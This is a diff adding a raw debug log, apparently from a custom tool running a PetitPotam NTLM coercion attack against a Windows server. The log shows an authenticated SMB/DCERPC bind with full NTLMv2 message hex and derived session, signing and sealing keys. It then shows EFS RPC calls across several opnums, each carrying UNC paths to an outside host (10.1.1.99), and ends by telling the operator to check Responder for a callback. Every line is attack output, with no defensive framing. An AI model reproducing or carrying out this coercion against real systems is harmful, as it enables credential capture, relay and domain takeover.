@@ -1,0 +1,222 @@
+[+] SMB authenticated
+[*] Using PetitPotam coercion technique via \pipe\lsarpc
+[+] Pipe lsarpc opened, starting DCERPC auth...
+[DEBUG] NTLM Negotiate (40 bytes): 4e544c4d535350000100000035028862000000000000000000000000000000000601b11d0000000f
+[DEBUG] Bind packet (120 bytes): 05000b03100000007800280001000000b810b81000000000010000000000010088d481c650d8d0118c5200c04fd90f7e01000000045d888aeb1cc9119fe808002b104860020000000a0600007f3501004e544c4d535350000100000035028862000000000000000000000000000000000601b11d0000000f
+[+] Sending Bind via WritePipe...
+[DEBUG] BindAck length: 316
+[DEBUG] Packet type: 12 (expected 12 for BindAck)
+[DEBUG] First 24 bytes: 05000c03100000003c01f00001000000b810b81076650000
+[+] Received BindAck
+[DEBUG] auth_len = 240
+[DEBUG] frag_len = 316, packet len = 316
+[DEBUG] Calculated authTrailerStart = 68
+[DEBUG] Server returned auth_context_id: 79231 (0x1357f)
+[+] Got NTLM challenge: c6421eb8e6f68ee3
+[DEBUG] Challenge flags: 0x62890235
+[DEBUG] Challenge targetInfo: len=174, offset=66, challengeLen=240
+[DEBUG] Using extracted targetInfo (174 bytes)
+[DEBUG] Extracted hostname from AV_PAIR 0x0001: 12 bytes
+[DEBUG] Processing targetInfo (174 bytes)
+[DEBUG] Including AV_PAIR 0x0002 (len=10)
+[DEBUG] Including AV_PAIR 0x0001 (len=12)
+[DEBUG] Including AV_PAIR 0x0004 (len=34)
+[DEBUG] Including AV_PAIR 0x0003 (len=48)
+[DEBUG] Including AV_PAIR 0x0005 (len=34)
+[DEBUG] Including AV_PAIR 0x0007 (len=8)
+[DEBUG] After removing EOL: 170 bytes
+[DEBUG] TARGET_NAME construction:
+  cifs/ prefix: 10 bytes
+  hostname: 12 bytes
+  total TARGET_NAME: 22 bytes
+[DEBUG] Added TARGET_NAME AV_PAIR to targetInfo (200 bytes total)
+[DEBUG] targetInfo hex dump (last 50 bytes): 2e0074006f00700007000800b0b865adc96bdc010900160063006900660073002f0043004100520052004f00540000000000
+[DEBUG] buildTempBlob: targetInfo length=200, last 50 bytes: 2e0074006f00700007000800b0b865adc96bdc010900160063006900660073002f0043004100520052004f00540000000000
+[DEBUG] NTLMv2 identity: user='slacker' (upper: 'SLACKER') + domain='spinninglikea.top' = 'SLACKERspinninglikea.top'
+[DEBUG] NTProofStr: b0ff7bab7cf9c3f991ab12a795adfe71
+[DEBUG] SessionBaseKey: 318c6fd7e101b84f043a2374997f3a77
+[DEBUG] Client challenge (8 bytes): ce9b4f8921bcc093
+[DEBUG] LM response (24 bytes): 015394613c990df4b8cd84877c0c673dce9b4f8921bcc093
+[DEBUG] Server challenge: c6421eb8e6f68ee3
+[DEBUG] Base offset for payload: 88 bytes
+[DEBUG] KEY_EXCH: Generated random exported session key: 4644f073a4f1718ff6137174024f4ef3
+[DEBUG] KEY_EXCH: Encrypted session key: 3e7a20683abd30f3e033ae460ad47a38
+[DEBUG] Final SessionBaseKey (for MIC and crypto): 4644f073a4f1718ff6137174024f4ef3
+[DEBUG] Final Client SignKey: e1168e9b21cde6f36d4f9abac8bd57a5
+[DEBUG] Final Client SealKey: b97a91bae5acdfee8a2a7132d364550d
+[DEBUG] Final Server SignKey: 87f851605a33e3f3a88446398e77cac8
+[DEBUG] Final Server SealKey: 4136ba816d4948205023dc6dda2e0d89
+[DEBUG] Type 1 flags: 0x62000231
+[DEBUG] Challenge flags (auth.flags): 0x62890235
+[DEBUG] Response flags (Type 3): 0x62880231
+[DEBUG] Authenticate message breakdown:
+  Header: 64, VERSION: 8, MIC: 16
+  LM response: 24 bytes
+  NTLM response: 248 bytes
+  Domain: 34 bytes
+  User: 14 bytes
+  Workstation: 0 bytes
+  Encrypted session key: 16 bytes
+  Total: 424 bytes
+[DEBUG] Full Authenticate message written to /tmp/go_authenticate.bin
+[DEBUG] Authenticate message hex (first 200 bytes): 4e544c4d53535000030000001800180058000000f800f8007000000022002200680100000e000e008a01000000000000980100001000100098010000310288620601b11d0000000f00000000000000000000000000000000015394613c990df4b8cd84877c0c673dce9b4f8921bcc093b0ff7bab7cf9c3f991ab12a795adfe710101000000000000396820b1c96bdc01ce9b4f8921bcc0930000000002000a00730070006c006100740001000c0043004100520052004f005400040022007300700069006e006e00
+[DEBUG] MIC calculated: eb2d2ab0d737b76b7d4b0fc9d44ef9ba
+[DEBUG] Final Authenticate message hex (first 200 bytes): 4e544c4d53535000030000001800180058000000f800f8007000000022002200680100000e000e008a01000000000000980100001000100098010000310288620601b11d0000000feb2d2ab0d737b76b7d4b0fc9d44ef9ba015394613c990df4b8cd84877c0c673dce9b4f8921bcc093b0ff7bab7cf9c3f991ab12a795adfe710101000000000000396820b1c96bdc01ce9b4f8921bcc0930000000002000a00730070006c006100740001000c0043004100520052004f005400040022007300700069006e006e00
+[DEBUG] Authenticate message (424 bytes): 4e544c4d53535000030000001800180058000000f800f8007000000022002200680100000e000e008a01000000000000980100001000100098010000310288620601b11d0000000feb2d2ab0d737b76b7d4b0fc9d44ef9ba015394613c990df4b8cd8487
+[DEBUG] Calculated session keys for encryption
+[DEBUG] Sending Auth3 (452 bytes) via WritePipe
+[+] Sending Auth3 via WritePipe (should get SMB Write Response)...
+[+] Auth3 complete - wrote 452 bytes, got SMB Write Response
+[+] DCERPC authentication complete!
+[-] Trying PetitPotam opnum 0 (EfsRpcOpenFileRaw)...
+[DEBUG] Path variation 1/3
+[DEBUG] Stub (68 bytes): 1a000000000000001a0000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c00660069006c0065002e00740078007400000000000000
+[DEBUG] Using sequence number: 0 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=0, StubLen=68 (padded=68), alloc_hint=68
+[DEBUG] Authenticated request (116 bytes): 0500000310000000740010000200000044000000000000004a7cc8151acf1bb57303b3d8604e1d482cf17689c42111264e5c7bdf4d73d6c466d61db90e1fd0fa4d49fe5b9cec43398706b79c3e182076...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 2/3
+[DEBUG] Stub (52 bytes): 1200000000000000120000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c00000000000000
+[DEBUG] Using sequence number: 1 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=0, StubLen=52 (padded=52), alloc_hint=52
+[DEBUG] Authenticated request (100 bytes): 0500000310000000640010000200000034000000000000001f88d663fd6a7c05c1b2c2346d23a486fb7908f992e5693acf0fb780822d322aec32088340a473ea0950445eb9ebafe676a970110a060000...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 3/3
+[DEBUG] Stub (52 bytes): 1100000000000000110000005c005c00310030002e0031002e0031002e00390039005c0074006500730074000000000000000000
+[DEBUG] Using sequence number: 2 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=0, StubLen=52 (padded=52), alloc_hint=52
+[DEBUG] Authenticated request (100 bytes): 050000031000000064001000020000003400000000000000c4291831783cc64a42aa7fc632cca517e7e4d28ef2af50c52d78a95190956fb146c511a1ed7e4547716fee9b927c46fcf14a375a0a060000...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[-] Trying PetitPotam opnum 4 (EfsRpcEncryptFileSrv)...
+[DEBUG] Path variation 1/3
+[DEBUG] Stub (64 bytes): 1a000000000000001a0000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c00660069006c0065002e007400780074000000
+[DEBUG] Using sequence number: 3 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=4, StubLen=64 (padded=64), alloc_hint=64
+[DEBUG] Authenticated request (112 bytes): 0500000310000000700010000200000040000000000004000d828d533f6f772d933c45414bf85bb5596eef2e3cb630c2e51dfd0fc7de5945c4d37dcc3ffa76ad42dced5ad42d8c86c156dd87b4d111b4...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 2/3
+[DEBUG] Stub (48 bytes): 1200000000000000120000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c000000
+[DEBUG] Using sequence number: 4 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=4, StubLen=48 (padded=48), alloc_hint=48
+[DEBUG] Authenticated request (96 bytes): 0500000310000000600010000200000030000000000004005f1e8eafd2557002f38747d6f0b8fe41faa39732236e86167d8ba6ab601356e4176301def248addf2bd7365084b6af9a0a0600007f350100...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 3/3
+[DEBUG] Stub (48 bytes): 1100000000000000110000005c005c00310030002e0031002e0031002e00390039005c00740065007300740000000000
+[DEBUG] Using sequence number: 5 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=4, StubLen=48 (padded=48), alloc_hint=48
+[DEBUG] Authenticated request (96 bytes): 0500000310000000600010000200000030000000000004003cfe5b7cb1c248340773fd093cd944654568a1a1ab84668db4e1a569c95616945ab6731cdef0715eb05f0bba8d8a029a0a0600007f350100...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[-] Trying PetitPotam opnum 5 (EfsRpcDecryptFileSrv)...
+[DEBUG] Path variation 1/3
+[DEBUG] Stub (68 bytes): 1a000000000000001a0000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c00660069006c0065002e00740078007400000000000000
+[DEBUG] Using sequence number: 6 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=5, StubLen=68 (padded=68), alloc_hint=68
+[DEBUG] Authenticated request (116 bytes): 0500000310000000740010000200000044000000000005004b75f2488567d360829f02c82d37a16ac948d0ddd55c0af936cc1854ff3cd510fcf26fa0b06e805833f999b21aa8895420762c0ae3fa5672...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 2/3
+[DEBUG] Stub (52 bytes): 1200000000000000120000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c00000000000000
+[DEBUG] Using sequence number: 7 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=5, StubLen=52 (padded=52), alloc_hint=52
+[DEBUG] Authenticated request (100 bytes): 0500000310000000640010000200000034000000000005006cc64513f584a2daaa22260a35b60ae05069e91123e11435becf3ceee8c47f397ec0a16e3aa30d219ee5e6fe2dcac601165127040a060000...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 3/3
+[DEBUG] Stub (52 bytes): 1100000000000000110000005c005c00310030002e0031002e0031002e00390039005c0074006500730074000000000000000000
+[DEBUG] Using sequence number: 8 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=5, StubLen=52 (padded=52), alloc_hint=52
+[DEBUG] Authenticated request (100 bytes): 050000031000000064001000020000003400000000000500a38f34ccfa20df2179748bca53f8aa891b3f1d187f5825f35ed90f9680dd44ad7778d13f7849e27a2a875f92f66b6d15b21889d70a060000...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[-] Trying PetitPotam opnum 6 (EfsRpcQueryUsersOnFile)...
+[DEBUG] Path variation 1/3
+[DEBUG] Stub (64 bytes): 1a000000000000001a0000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c00660069006c0065002e007400780074000000
+[DEBUG] Using sequence number: 9 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=6, StubLen=64 (padded=64), alloc_hint=64
+[DEBUG] Authenticated request (112 bytes): 050000031000000070001000020000004000000000000600afbf8a4400c594717064bf2d6f97d548741acfb8e9d4b765499c4702bfd2fc3fd694f025efc030e959782cf7b2837a1392c7939a25935fac...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 2/3
+[DEBUG] Stub (48 bytes): 1200000000000000120000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c000000
+[DEBUG] Using sequence number: 10 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=6, StubLen=48 (padded=48), alloc_hint=48
+[DEBUG] Authenticated request (96 bytes): 0500000310000000600010000200000030000000000006000e5de5c3222a3435f25ce6702b264dc3c842582fe984077fe28c4d9784c8b145831fbc448e09a3749fd60a356974e43a0a0600007f350100...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 3/3
+[DEBUG] Stub (48 bytes): 1100000000000000110000005c005c00310030002e0031002e0031002e00390039005c00740065007300740000000000
+[DEBUG] Using sequence number: 11 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=6, StubLen=48 (padded=48), alloc_hint=48
+[DEBUG] Authenticated request (96 bytes): 0500000310000000600010000200000030000000000006005b5f5229b9077cb57c43d3b04ceed739d127fe51252f756a4c4de78339e8dba8c2d4fdb075b273022a1b574160bcabc80a0600007f350100...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[-] Trying PetitPotam opnum 7 (EfsRpcQueryRecoveryAgents)...
+[DEBUG] Path variation 1/3
+[DEBUG] Stub (64 bytes): 1a000000000000001a0000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c00660069006c0065002e007400780074000000
+[DEBUG] Using sequence number: 12 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=7, StubLen=64 (padded=64), alloc_hint=64
+[DEBUG] Authenticated request (112 bytes): 0500000310000000700010000200000040000000000007003097e9cf011480101aa44684e7e9a487a8c030a246767a3de4013365bd9af3c1c1cc65e9eb022219f0c69e3d33d52d92b8264d02d7d1f052...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 2/3
+[DEBUG] Stub (48 bytes): 1200000000000000120000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c000000
+[DEBUG] Using sequence number: 13 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=7, StubLen=48 (padded=48), alloc_hint=48
+[DEBUG] Authenticated request (96 bytes): 05000003100000006000100002000000300000000000070044328dde499759a81f7144e6049982142d91d09336b175b538282e4537cf2246ac941e46c105209edb2e1398b7597d3b0a0600007f350100...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 3/3
+[DEBUG] Stub (48 bytes): 1100000000000000110000005c005c00310030002e0031002e0031002e00390039005c00740065007300740000000000
+[DEBUG] Using sequence number: 14 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=7, StubLen=48 (padded=48), alloc_hint=48
+[DEBUG] Authenticated request (96 bytes): 050000031000000060001000020000003000000000000700239048fd0c22d663bdd9040343ebac8b369b5964b3abbe3b57a271c42558f2581ecb1b884705918f0ece5250e89ee7830a0600007f350100...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[-] Trying PetitPotam opnum 12 (EfsRpcFileKeyInfo)...
+[DEBUG] Path variation 1/3
+[DEBUG] Stub (68 bytes): 1a000000000000001a0000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c00660069006c0065002e00740078007400000000000000
+[DEBUG] Using sequence number: 15 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=12, StubLen=68 (padded=68), alloc_hint=68
+[DEBUG] Authenticated request (116 bytes): 050000031000000074001000020000004400000000000c00425a635898eff4c2484f8c9e46273ebfbfc5f5a159c5dda0735144ac01cf0571793f5a7108ba643edb9a7570b7160f543e6ff084637ef71b...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 2/3
+[DEBUG] Stub (52 bytes): 1200000000000000120000005c005c00310030002e0031002e0031002e00390039005c0074006500730074005c00000000000000
+[DEBUG] Using sequence number: 16 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=12, StubLen=52 (padded=52), alloc_hint=52
+[DEBUG] Authenticated request (100 bytes): 050000031000000064001000020000003400000000000c0043f67f43faff522bfadfa77e2cd6d8099f4678ae38cf7f493cdf527fc86a04d6f5392cd607985f688749f8db037097aa9df7c7c50a060000...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[DEBUG] Path variation 3/3
+[DEBUG] Stub (52 bytes): 1100000000000000110000005c005c00310030002e0031002e0031002e00390039005c0074006500730074000000000000000000
+[DEBUG] Using sequence number: 17 for authenticated request
+[DEBUG] DCERPC Request: ContextID=0, Opnum=12, StubLen=52 (padded=52), alloc_hint=52
+[DEBUG] Authenticated request (100 bytes): 050000031000000064001000020000003400000000000c00fce1a75abf7ed05bcb3e3860d776b501b3837f342921d77f26e50c761bd952f9d375adc69d4058af85bc4e377b4b7c276adcc6140a060000...
+[+] Sending authenticated request via WritePipe...
+[DEBUG] Got 32 bytes encrypted response
+[DEBUG] Response: type=3, fragLen=32, authLen=0
+[+] Got error: got fault 0x1c010003
+[+] Check Responder for callback!
